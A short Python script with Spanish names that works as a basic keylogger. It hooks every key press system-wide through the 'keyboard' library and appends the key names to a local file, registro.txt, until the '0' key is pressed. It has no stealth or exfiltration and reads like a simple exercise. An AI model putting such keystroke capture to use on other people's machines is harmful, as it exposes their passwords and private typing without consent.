import keyboard

def grabar(tecla):
    with open("registro.txt", "a") as f:
        f.write(f"{tecla.name} ")

fin = '0'

keyboard.on_press(grabar)
keyboard.wait(fin)

